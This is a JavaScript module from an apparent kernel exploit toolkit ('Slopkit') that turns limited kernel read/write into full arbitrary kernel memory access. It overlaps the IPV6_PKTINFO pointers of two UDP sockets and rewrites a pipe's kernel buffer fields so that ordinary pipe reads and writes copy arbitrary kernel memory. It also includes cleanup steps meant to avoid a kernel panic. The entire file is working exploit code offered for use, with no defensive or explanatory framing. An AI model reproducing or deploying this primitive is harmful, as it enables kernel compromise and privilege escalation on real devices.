(function (root) {
    "use strict";

    var NS = root.Slopkit = root.Slopkit || {};
    var U64 = NS.U64;
    var readU64LE = NS.readU64LE;
    var writeU64LE = NS.writeU64LE;
    var readU32LE = NS.readU32LE;
    var writeU32LE = NS.writeU32LE;
    if (!U64) throw new Error("u64.js must be loaded before ipv6-kernel-rw.js");

    var PKTINFO_SIZE = 0x14;
    // struct pipebuf (0x18) followed by the two 64-bit pipe_map fields that
    // the second 20-byte IPV6_PKTINFO write overlaps.
    var PIPE_STATE_SIZE = 0x28;

    function Ipv6KernelRw(options) {
        this.bridge = options.bridge;
        this.allocator = options.allocator;
        this.memory = options.memory;
        this.profile = options.profile;
        this.ofiles = U64.from(options.ofiles);
        this._kread8 = options.kread8;
        this._kwrite8 = options.kwrite8;
        this._resolveFileTable = options.resolveFileTable || null;
        // Keep the older entries-only callback usable by standalone consumers
        // and tests. New exploit paths should provide resolveFileTable so a
        // replaced struct filedesc can be followed as well as a resized table.
        this._refreshOfiles = options.refreshOfiles || null;
        this.filedesc = options.filedesc === undefined
            ? U64.zero() : U64.from(options.filedesc);
        this.fdt = options.table === undefined
            ? (this.ofiles.isZero() ? U64.zero()
                : this.ofiles.sub(this.off("kernel.structures.fdtOfiles")))
            : U64.from(options.table);
        this.fdtNfiles = Number.isInteger(options.capacity)
            ? options.capacity : 0;
        this.ofilesRefreshCount = 0;
        this.ofilesRelocations = 0;
        this.fdtRelocations = 0;
        this.filedescRelocations = 0;

        this.pipeReadFd = -1;
        this.pipeWriteFd = -1;
        this.pipeAddr = U64.zero();
        this.pipeState = null;
        this.pipeTail = null;
        this.pipeTailRestores = 0;
        this.pipeQuarantineVerifications = 0;
        this.pipemapBuf = null;
        this.readBuf = null;
        this.masterBuf = null;
        this.slaveBuf = null;
        this.sizeBuf = null;
        this.masterSock = -1;
        this.victimSock = -1;
        this.masterPktopts = U64.zero();
        this.victimPktopts = U64.zero();
        this.masterPktinfoOriginal = U64.zero();
        this.victimPktinfoOriginal = U64.zero();
        this.socketTransportDisarmed = false;
        this.ready = false;
        this.sealed = false;
        this.sealResult = null;
    }

    Ipv6KernelRw.prototype.off = function (path) {
        return this.profile.offset(path);
    };

    Ipv6KernelRw.prototype.callI32 = function (path, args) {
        return this.bridge.callOffsetI32(path, args);
    };

    Ipv6KernelRw.prototype.callRaw = function (path, args) {
        return this.bridge.callOffset(path, args);
    };

    Ipv6KernelRw.prototype.lastErrno = function () {
        try {
            var pointer = this.callRaw("native.exports.error", []);
            return this.memory.read32(
                U64.from(pointer).toPointerNumber()) | 0;
        } catch {
            return null;
        }
    };

    Ipv6KernelRw.prototype.syscallFailure = function (operation, result, fd,
            target) {
        var message = "ipv6rw: " + operation + " failed " + result
            + " fd=" + fd;
        if (target !== undefined && target !== null)
            message += " target=" + U64.from(target).toHex();
        var errno = this.lastErrno();
        if (errno !== null) message += " errno=" + errno;
        return new Error(message);
    };

    Ipv6KernelRw.prototype.alloc = function (size, align, label) {
        return this.allocator.alloc(size, align, label);
    };

    Ipv6KernelRw.prototype.assertKernelPointer = function (value, label) {
        var pointer = U64.from(value);
        if (!pointer.isKernelPointer())
            throw new Error("ipv6rw: invalid " + label + " "
                + pointer.toHex());
        return pointer;
    };

    Ipv6KernelRw.prototype.applyFileTable = function (resolved) {
        if (!resolved || typeof resolved !== "object")
            throw new Error("ipv6rw: file-table resolver returned no record");
        var filedesc = this.assertKernelPointer(resolved.filedesc,
            "resolved filedesc");
        var fdt = this.assertKernelPointer(resolved.table,
            "resolved descriptor table");
        var entries = this.assertKernelPointer(resolved.entries,
            "resolved descriptor entries");
        var capacity = Number(resolved.capacity);
        var headerOffset = this.off("kernel.structures.fdtOfiles");
        if (!entries.eq(fdt.add32(headerOffset)))
            throw new Error("ipv6rw: descriptor entries do not match table header");
        if (!Number.isInteger(capacity) || capacity <= 0
                || capacity > 0x100000)
            throw new Error("ipv6rw: invalid descriptor-table capacity "
                + capacity);

        if (!this.filedesc.isZero() && !this.filedesc.eq(filedesc))
            this.filedescRelocations += 1;
        if (!this.fdt.isZero() && !this.fdt.eq(fdt))
            this.fdtRelocations += 1;
        if (!this.ofiles.isZero() && !this.ofiles.eq(entries))
            this.ofilesRelocations += 1;
        this.filedesc = filedesc;
        this.fdt = fdt;
        this.ofiles = entries;
        this.fdtNfiles = capacity;
        this.ofilesRefreshCount += 1;
        return {
            filedesc: filedesc, table: fdt, entries: entries,
            capacity: capacity
        };
    };

    Ipv6KernelRw.prototype.resolveFileTable = function () {
        if (this._resolveFileTable)
            return this.applyFileTable(this._resolveFileTable());
        if (!this._refreshOfiles)
            throw new Error("ipv6rw: file-table resolver is unavailable");

        var entries = this.assertKernelPointer(this._refreshOfiles(),
            "refreshed descriptor entries");
        var fdt = entries.sub(this.off("kernel.structures.fdtOfiles"));
        this.assertKernelPointer(fdt, "refreshed descriptor table");
        var capacity = U64.from(this._kread8(fdt)).toNumber();
        if (!Number.isInteger(capacity) || capacity <= 0
                || capacity > 0x100000)
            throw new Error("ipv6rw: invalid descriptor-table capacity "
                + capacity);
        if (!this.fdt.isZero() && !this.fdt.eq(fdt))
            this.fdtRelocations += 1;
        if (!this.ofiles.isZero() && !this.ofiles.eq(entries))
            this.ofilesRelocations += 1;
        this.fdt = fdt;
        this.ofiles = entries;
        this.fdtNfiles = capacity;
        this.ofilesRefreshCount += 1;
        return {
            filedesc: this.filedesc, table: fdt, entries: entries,
            capacity: capacity
        };
    };

    Ipv6KernelRw.prototype.getFdDataAddr = function (fd) {
        if (!Number.isInteger(fd) || fd < 0)
            throw new Error("ipv6rw: invalid fd " + fd);
        this.resolveFileTable();
        if (fd >= this.fdtNfiles)
            throw new Error("ipv6rw: fd " + fd
                + " exceeds descriptor-table capacity " + this.fdtNfiles);
        var stride = this.off("kernel.structures.filedescentSize");
        var fde = this.ofiles.add32(fd * stride);
        var fp = this._kread8(fde);
        this.assertKernelPointer(fp, "file pointer for fd " + fd);
        var data = this._kread8(fp);
        return this.assertKernelPointer(data, "file data for fd " + fd);
    };

    Ipv6KernelRw.prototype.init = function () {
        this._createPipes();
        this._createOverlappedSockets();
        this.ready = true;
    };

    Ipv6KernelRw.prototype._createPipes = function () {
        var c = this.profile.raw.kernel.constants;
        var fds = this.alloc(8, 4, "ipv6rw-pipe-fds");
        if (this.callI32("native.exports.pipe", [fds.address]) !== 0)
            throw new Error("ipv6rw: pipe failed");
        this.pipeReadFd = fds.get32(0) | 0;
        this.pipeWriteFd = fds.get32(4) | 0;
        if (this.pipeReadFd < 0 || this.pipeWriteFd < 0)
            throw new Error("ipv6rw: bad pipe descriptors");

        for (var i = 0; i < 2; ++i) {
            var fd = i === 0 ? this.pipeReadFd : this.pipeWriteFd;
            var fcntlResult = this.callI32("native.exports.fcntl",
                [fd, c.fSetfl, c.oNonblock]);
            if (fcntlResult !== 0)
                throw new Error("ipv6rw: pipe fcntl failed " + fcntlResult);
        }

        this.pipeAddr = this.getFdDataAddr(this.pipeReadFd);
        this.assertKernelPointer(this.pipeAddr, "pipe address");

        this.pipeState = this.alloc(PIPE_STATE_SIZE, 8,
            "ipv6rw-pipe-state");
        // The pipe is private and unused here, so two identical snapshots are
        // expected.  A moving snapshot would make later exact restoration
        // unsafe.
        for (var offset = 0; offset < PIPE_STATE_SIZE; offset += 8) {
            var first = this._kread8(this.pipeAddr.add32(offset));
            var second = this._kread8(this.pipeAddr.add32(offset));
            if (!U64.from(first).eq(second))
                throw new Error("ipv6rw: unstable original pipe state +0x"
                    + offset.toString(16));
            this.pipeState.put64(offset, first);
        }
        this.pipeTail = this.pipeState.sub(0x10, PKTINFO_SIZE,
            "ipv6rw-pipe-tail");

        this.pipemapBuf = this.alloc(PKTINFO_SIZE, 8, "ipv6rw-pipemap");
        var pageSize = Number(this.off("kernel.constants.pageSize")) || 0x4000;
        this.readBuf = this.alloc(pageSize, 0x10, "ipv6rw-readmem");
    };

    Ipv6KernelRw.prototype._createOverlappedSockets = function () {
        var c = this.profile.raw.kernel.constants;
        this.masterBuf = this.alloc(PKTINFO_SIZE, 8, "ipv6rw-master");
        this.slaveBuf = this.alloc(PKTINFO_SIZE, 8, "ipv6rw-slave");
        this.sizeBuf = this.alloc(8, 4, "ipv6rw-size");
        this.sizeBuf.put32(0, PKTINFO_SIZE);

        this.masterSock = this.callI32("native.exports.socket",
            [c.afInet6, c.sockDgram, c.ipprotoUdp]);
        this.victimSock = this.callI32("native.exports.socket",
            [c.afInet6, c.sockDgram, c.ipprotoUdp]);
        if (this.masterSock < 0 || this.victimSock < 0)
            throw new Error("ipv6rw: socket failed");

        var masterSet = this.callI32("native.exports.setsockopt",
            [this.masterSock, c.ipprotoIpv6, c.ipv6Pktinfo,
                this.masterBuf.address, PKTINFO_SIZE]);
        var victimSet = this.callI32("native.exports.setsockopt",
            [this.victimSock, c.ipprotoIpv6, c.ipv6Pktinfo,
                this.slaveBuf.address, PKTINFO_SIZE]);
        if (masterSet !== 0 || victimSet !== 0)
            throw new Error("ipv6rw: pktinfo setup failed master="
                + masterSet + " victim=" + victimSet);

        var soPcb = 0x18;
        var inpcbPktopts = this.off("kernel.structures.in6pOutputopts");

        var masterSo = this.getFdDataAddr(this.masterSock);
        var masterPcb = this._kread8(masterSo.add32(soPcb));
        this.assertKernelPointer(masterPcb, "master PCB");
        var masterPktopts = this._kread8(masterPcb.add32(inpcbPktopts));
        this.assertKernelPointer(masterPktopts, "master pktopts");

        var victimSo = this.getFdDataAddr(this.victimSock);
        var victimPcb = this._kread8(victimSo.add32(soPcb));
        this.assertKernelPointer(victimPcb, "victim PCB");
        var victimPktopts = this._kread8(victimPcb.add32(inpcbPktopts));
        this.assertKernelPointer(victimPktopts, "victim pktopts");
        if (masterSo.eq(victimSo) || masterPcb.eq(victimPcb)
                || masterPktopts.eq(victimPktopts))
            throw new Error("ipv6rw: master and victim objects are not distinct");

        var masterPktinfo = this._kread8(masterPktopts.add32(0x10));
        this.assertKernelPointer(masterPktinfo,
            "master original pktinfo allocation");
        var victimPktinfo = this._kread8(victimPktopts.add32(0x10));
        this.assertKernelPointer(victimPktinfo,
            "victim original pktinfo allocation");
        if (masterPktinfo.eq(victimPktinfo))
            throw new Error("ipv6rw: original pktinfo allocations are aliased");
        this._kwrite8(masterPktopts.add32(0x10), victimPktopts.add32(0x10));
        var overlap = this._kread8(masterPktopts.add32(0x10));
        if (!overlap.eq(victimPktopts.add32(0x10)))
            throw new Error("ipv6rw: pktinfo overlap write did not persist");
        this.masterPktopts = masterPktopts;
        this.victimPktopts = victimPktopts;
        this.masterPktinfoOriginal = masterPktinfo;
        this.victimPktinfoOriginal = victimPktinfo;
    };

    Ipv6KernelRw.prototype._writeToVictim = function (kaddr) {
        var c = this.profile.raw.kernel.constants;
        kaddr = this.assertKernelPointer(kaddr, "victim target");
        this.masterBuf.put64(0, kaddr);
        this.masterBuf.put64(8, 0);
        this.masterBuf.put32(0x10, 0);
        var result = this.callI32("native.exports.setsockopt",
            [this.masterSock, c.ipprotoIpv6, c.ipv6Pktinfo,
                this.masterBuf.address, PKTINFO_SIZE]);
        if (result !== 0)
            throw this.syscallFailure("master pktinfo write", result,
                this.masterSock, kaddr);
    };

    Ipv6KernelRw.prototype._ipv6Kread = function (kaddr, outputBuf) {
        var c = this.profile.raw.kernel.constants;
        this._writeToVictim(kaddr);
        this.sizeBuf.put32(0, PKTINFO_SIZE);
        var result = this.callI32("native.exports.getsockopt",
            [this.victimSock, c.ipprotoIpv6, c.ipv6Pktinfo,
                outputBuf.address, this.sizeBuf.address]);
        if (result !== 0)
            throw this.syscallFailure("victim pktinfo read", result,
                this.victimSock, kaddr);
        var actual = this.sizeBuf.get32(0);
        if (actual !== PKTINFO_SIZE)
            throw new Error("ipv6rw: victim pktinfo read shortened "
                + actual + "/" + PKTINFO_SIZE);
    };

    Ipv6KernelRw.prototype._ipv6Kwrite = function (kaddr, inputBuf) {
        var c = this.profile.raw.kernel.constants;
        this._writeToVictim(kaddr);
        var result = this.callI32("native.exports.setsockopt",
            [this.victimSock, c.ipprotoIpv6, c.ipv6Pktinfo,
                inputBuf.address, PKTINFO_SIZE]);
        if (result !== 0)
            throw this.syscallFailure("victim pktinfo write", result,
                this.victimSock, kaddr);
    };

    Ipv6KernelRw.prototype._restorePipeTail = function () {
        if (!this.pipeTail)
            throw new Error("ipv6rw: original pipe tail is unavailable");
        this._ipv6Kwrite(this.pipeAddr.add32(0x10), this.pipeTail);
        this.pipeTailRestores += 1;
    };

    Ipv6KernelRw.prototype._pipeBytesEqual = function (left, right, length) {
        var a = left.read(0, length);
        var b = right.read(0, length);
        if (a.length !== b.length) return false;
        for (var i = 0; i < a.length; ++i)
            if (a[i] !== b[i]) return false;
        return true;
    };

    Ipv6KernelRw.prototype.prepareQuarantineState = function () {
        if (!this.pipeTail)
            throw new Error("ipv6rw: original pipe tail is unavailable");

        // Leave the private pipe in the same bounded artificial read state used
        // by every successful copyout. Restoring its live header was the r9
        // panic candidate; the quarantined descriptors and file objects remain
        // pinned until reboot instead.
        this.pipemapBuf.put64(0, U64.fromHex("0x4000000040000000"));
        this.pipemapBuf.put64(8, U64.fromHex("0x4000000000000000"));
        this.pipemapBuf.put32(0x10, 0);
        this._ipv6Kwrite(this.pipeAddr, this.pipemapBuf);
        this._restorePipeTail();

        var expectedHead = this.alloc(PKTINFO_SIZE, 8,
            "ipv6rw-quarantine-expected-head");
        expectedHead.put64(0, U64.fromHex("0x4000000040000000"));
        expectedHead.put64(8, U64.fromHex("0x4000000000000000"));
        expectedHead.write(0x10, this.pipeTail.read(0, 4));
        var verifyHead = this.alloc(PKTINFO_SIZE, 8,
            "ipv6rw-quarantine-verify-head");
        var verifyTail = this.alloc(PKTINFO_SIZE, 8,
            "ipv6rw-quarantine-verify-tail");
        this._ipv6Kread(this.pipeAddr, verifyHead);
        this._ipv6Kread(this.pipeAddr.add32(0x10), verifyTail);
        if (!this._pipeBytesEqual(expectedHead, verifyHead, PKTINFO_SIZE)
                || !this._pipeBytesEqual(this.pipeTail, verifyTail,
                    PKTINFO_SIZE))
            throw new Error("ipv6rw: quarantine pipe state verification failed");
        this.pipeQuarantineVerifications += 1;
    };

    Ipv6KernelRw.prototype.disarmSocketTransport = function () {
        if (typeof this._kwrite8 !== "function")
            throw new Error("ipv6rw: restricted writer is unavailable");
        this._writeToVictim(this.victimPktinfoOriginal);
        var victim = U64.from(this._kread8(
            this.victimPktopts.add32(0x10)));
        if (!victim.eq(this.victimPktinfoOriginal))
            throw new Error("ipv6rw: victim pktinfo disarm did not persist");

        this._kwrite8(this.masterPktopts.add32(0x10),
            this.masterPktinfoOriginal);
        var master = U64.from(this._kread8(
            this.masterPktopts.add32(0x10)));
        victim = U64.from(this._kread8(this.victimPktopts.add32(0x10)));
        if (!master.eq(this.masterPktinfoOriginal)
                || !victim.eq(this.victimPktinfoOriginal))
            throw new Error("ipv6rw: socket transport disarm verification failed");
        this.socketTransportDisarmed = true;
    };

    Ipv6KernelRw.prototype.copyout = function (kaddr, outputBuf, length) {
        if (!this.ready) throw new Error("ipv6rw: primitive is not ready");
        this.assertKernelPointer(kaddr, "copyout address");
        outputBuf.check(0, length);
        this.pipemapBuf.put64(0, U64.fromHex("0x4000000040000000"));
        this.pipemapBuf.put64(8, U64.fromHex("0x4000000000000000"));
        this.pipemapBuf.put32(0x10, 0);
        var touched = false;
        try {
            this._ipv6Kwrite(this.pipeAddr, this.pipemapBuf);
            touched = true;

            this.pipemapBuf.put64(0, kaddr);
            this.pipemapBuf.put64(8, 0);
            this.pipemapBuf.put32(0x10, 0);
            this._ipv6Kwrite(this.pipeAddr.add32(0x10), this.pipemapBuf);

            return this.callRaw("native.exports.read",
                [this.pipeReadFd, outputBuf.address, length]).toInt32();
        } finally {
            if (touched) this._restorePipeTail();
        }
    };

    Ipv6KernelRw.prototype.copyin = function (inputBuf, kaddr, length) {
        if (!this.ready) throw new Error("ipv6rw: primitive is not ready");
        this.assertKernelPointer(kaddr, "copyin address");
        inputBuf.check(0, length);
        this.pipemapBuf.put64(0, 0);
        this.pipemapBuf.put64(8, U64.fromHex("0x4000000000000000"));
        this.pipemapBuf.put32(0x10, 0);
        var touched = false;
        try {
            this._ipv6Kwrite(this.pipeAddr, this.pipemapBuf);
            touched = true;

            this.pipemapBuf.put64(0, kaddr);
            this.pipemapBuf.put64(8, 0);
            this.pipemapBuf.put32(0x10, 0);
            this._ipv6Kwrite(this.pipeAddr.add32(0x10), this.pipemapBuf);

            return this.callRaw("native.exports.write",
                [this.pipeWriteFd, inputBuf.address, length]).toInt32();
        } finally {
            if (touched) this._restorePipeTail();
        }
    };

    Ipv6KernelRw.prototype.read = function (address, size) {
        if (size <= 0 || size > 0x4000)
            throw new RangeError("ipv6rw: invalid read size " + size);
        var pageSize = Number(this.off("kernel.constants.pageSize")) || 0x4000;
        var buf = size <= pageSize
            ? this.readBuf : this.alloc(size, 0x10, "ipv6rw-large-read");
        var n = this.copyout(address, buf, size);
        if (n !== size)
            throw new Error("ipv6rw: read returned " + n + "/" + size);
        return buf.read(0, size);
    };

    Ipv6KernelRw.prototype.write = function (address, source) {
        var bytes = source instanceof Uint8Array ? source : new Uint8Array(source);
        if (!bytes.length || bytes.length > 0x4000)
            throw new RangeError("ipv6rw: invalid write size " + bytes.length);
        var tmp = this.alloc(bytes.length, 8, "ipv6rw-write-tmp");
        tmp.write(0, bytes);
        var n = this.copyin(tmp, address, bytes.length);
        if (n !== bytes.length)
            throw new Error("ipv6rw: write returned " + n + "/" + bytes.length);
    };

    Ipv6KernelRw.prototype.read8 = function (address) {
        return this.read(address, 1)[0];
    };
    Ipv6KernelRw.prototype.read32 = function (address) {
        return readU32LE(this.read(address, 4), 0);
    };
    Ipv6KernelRw.prototype.read64 = function (address) {
        return readU64LE(this.read(address, 8), 0);
    };

    Ipv6KernelRw.prototype.write8 = function (address, value) {
        this.write(address, new Uint8Array([value & 0xff]));
    };
    Ipv6KernelRw.prototype.write32 = function (address, value) {
        var b = new Uint8Array(4); writeU32LE(b, 0, value);
        this.write(address, b);
    };
    Ipv6KernelRw.prototype.write64 = function (address, value) {
        var b = new Uint8Array(8); writeU64LE(b, 0, value);
        this.write(address, b);
    };

    Ipv6KernelRw.prototype.quarantine = function (fileHolds) {
        if (this.sealed) return this.sealResult;
        if (!this.ready)
            throw new Error("ipv6rw: quarantine requires a live primitive");
        var holds = Array.isArray(fileHolds) ? fileHolds : [];
        var heldFds = [];
        for (var holdIndex = 0; holdIndex < holds.length; ++holdIndex) {
            var record = holds[holdIndex];
            if (!record || !Number.isInteger(record.fd) || record.fd < 0
                    || record.verified !== true
                    || heldFds.indexOf(record.fd) !== -1)
                throw new Error("ipv6rw: quarantine file holds are invalid");
            heldFds.push(record.fd);
        }
        var required = [this.pipeReadFd, this.pipeWriteFd,
            this.masterSock, this.victimSock];
        for (var i = 0; i < required.length; ++i) {
            var held = false;
            for (var j = 0; j < holds.length; ++j) {
                if (holds[j].fd === required[i]) {
                    held = true;
                    break;
                }
            }
            if (!held)
                throw new Error("ipv6rw: helper fd " + required[i]
                    + " is not pinned");
        }
        var readFd = this.pipeReadFd;
        var writeFd = this.pipeWriteFd;
        this.prepareQuarantineState();
        this.disarmSocketTransport();

        this.ready = false;
        this.sealed = true;
        this.sealResult = Object.freeze({
            strategy: "pinned-quarantine",
            heldDescriptors: holds.length,
            pipeHeadMode: "copyout",
            pipeTailVerified: true,
            tailRestores: this.pipeTailRestores,
            quarantineVerifications: this.pipeQuarantineVerifications,
            socketTransportDisarmed: this.socketTransportDisarmed,
            readFd: readFd,
            writeFd: writeFd
        });
        return this.sealResult;
    };

    Ipv6KernelRw.prototype.seal = function (fileHolds) {
        return this.quarantine(fileHolds);
    };

    NS.Ipv6KernelRw = Ipv6KernelRw;
    if (typeof module !== "undefined" && module.exports)
        module.exports = { Ipv6KernelRw: Ipv6KernelRw };
})(typeof globalThis !== "undefined" ? globalThis : this);
